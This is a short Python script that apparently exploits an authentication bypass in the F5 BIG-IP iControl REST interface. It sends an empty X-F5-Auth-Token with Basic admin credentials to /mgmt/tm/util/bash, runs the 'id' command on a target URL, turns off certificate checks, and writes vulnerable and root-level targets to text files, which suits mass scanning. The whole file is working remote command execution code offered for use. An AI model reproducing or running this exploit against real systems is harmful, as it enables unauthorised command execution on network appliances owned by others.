import requests
import sys
import json
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def main():
    target_url = sys.argv[1]
    print(target_url)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Content-Type': 'application/json',
        'X-F5-Auth-Token': '',
        'Authorization': 'Basic YWRtaW46QVNhc1M='
    }

    data = json.dumps({'command': 'run' , 'utilCmdArgs': '-c id' })
    check_url = target_url + '/mgmt/tm/util/bash'
    time.sleep(0.01)
    r = requests.post(url=check_url, data=data, headers=headers, verify=False, timeout=20)
    if r.status_code == 200 and 'commandResult' in r.text:
        with open('1.txt', 'a') as file:
            file.write(target_url+'\n')
        file.close()
        
    if ('uid=' in str(r.content, 'utf-8') and 'gid=' in str(r.content, 'utf-8')):
        with open('3.txt', 'a') as file:
            file.write(target_url+'\n')
        file.close()
            
    if ('uid=0(root) gid=0(wheel)' in str(r.content, 'utf-8')):
        with open('2.txt', 'a') as file:
            file.write(target_url+'\n')
        file.close()
   

if __name__ == '__main__':
    main()
